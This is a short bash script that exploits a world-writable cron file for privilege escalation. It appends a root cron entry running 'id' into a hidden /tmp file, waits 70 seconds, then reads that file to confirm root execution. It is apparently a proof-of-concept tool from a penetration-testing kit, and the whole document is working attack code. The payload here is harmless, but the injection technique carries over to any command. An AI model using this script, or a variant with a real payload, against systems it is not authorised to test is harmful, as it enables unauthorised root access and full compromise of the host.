#!/bin/bash
# Inject command into writable cron file for privilege escalation
# Usage: writable_cron.sh <writable_cron_file_path>
set -euo pipefail

CFILE="${1:-}"

echo "* * * * * root id > /tmp/.privesc_proof" >> "$CFILE"
echo "Injected cron into $CFILE, waiting 70s..."
sleep 70
cat /tmp/.privesc_proof 2>/dev/null || echo "CRON_INJECT_FAILED"
